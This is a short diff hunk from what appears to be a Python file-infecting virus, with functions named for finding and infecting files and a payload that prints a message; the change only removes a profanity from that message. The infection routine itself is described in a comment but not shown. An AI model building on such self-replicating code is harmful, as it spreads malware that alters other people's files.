@@ -44,7 +44,7 @@ def find_files_to_infect(directory = "."):
 
 def summon_chaos():
   # the virus payload
-  print("We are sick, fucked up and complicated\nWe are chaos, we can't be cured")
+  print("We are sick, and complicated\nWe are chaos, we can't be cured")
 
 def infect(file, virus_code):
   # infect a single file. The routine open the file and if it's not been infected yet, infect the file with a custom version of the virus code
